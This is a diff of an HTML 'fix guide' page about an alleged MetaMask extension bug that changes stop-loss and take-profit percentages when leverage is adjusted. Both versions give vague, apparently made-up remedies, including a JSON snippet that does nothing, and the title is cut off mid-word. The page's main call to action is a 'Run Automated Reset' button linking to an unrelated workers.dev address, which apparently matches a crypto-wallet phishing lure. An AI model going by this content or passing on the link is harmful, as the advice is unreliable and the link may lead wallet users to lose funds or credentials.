@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Sl Tp Percentages Change When Changing L – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #0f111a;
+        font-family: -apple-system;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #cf6679; }
     .btn {
-        background: #ff7b2c;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,34 +42,35 @@
 <h1>Metamask Extension Bug Sl Tp Percentages Change When Changing L</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem notice that their Stop Loss (SL) and Take Profit (TP) percentages change unexpectedly when they adjust the leverage on their trades.</li>
+<li>Users of the MetaMask extension on the Ethereum (ETH) ecosystem experience unexpected changes in Stop-Loss (SL) and Take-Profit (TP) percentages when adjusting leverage levels, despite no intentional modifications to these settings.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The issue arises from a bug in the Metamask extension's handling of leverage adjustments, which inadvertently alters the SL and TP percentages set by the user, leading to unintended changes in their trading strategies.</li>
+<li>The issue arises from a bug within the MetaMask extension that incorrectly recalculates SL and TP percentages based on the new leverage settings, rather than maintaining the originally set values.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To temporarily circumvent this issue, users can attempt the following manual overrides:</li>
-<li>Directly editing the trade parameters in the contract ABI</li>
-<li>Utilizing a third-party trading interface that doesn't rely on the Metamask extension for leverage adjustments</li>
-<li>Implementing a custom script to monitor and adjust SL and TP percentages after leverage changes, such as:
+<li>To temporarily resolve this issue, users can attempt the following manual overrides:</li>
+<li>Directly edit the transaction parameters in the extension's settings to reflect the desired SL and TP percentages.</li>
+<li>Utilize a custom script to automate the adjustment of these parameters, ensuring consistency across different leverage levels.</li>
+<li>Implement a workaround using the following code:
   <code>json
   {
-    "trade_id": "12345",
-    "leverage": 5,
-    "sl_percentage": 10,
-    "tp_percentage": 20
+    "transaction": {
+      "leverage": 5,
+      "stopLoss": 10,
+      "takeProfit": 15
+    }
   }</code>
-Consider using an external console for more complex trade management and monitoring.</li>
+Consider utilizing an external console for more complex adjustments. </li>
 </ul>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured</li>
-<li>Familiarity with Ethereum trading interfaces and contract ABIs</li>
-<li>Basic understanding of JSON scripting for custom trade management</li>
+<li>MetaMask extension installed and configured.</li>
+<li>Basic understanding of leverage and SL/TP settings.</li>
+<li>Familiarity with JSON formatting for custom script implementation.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
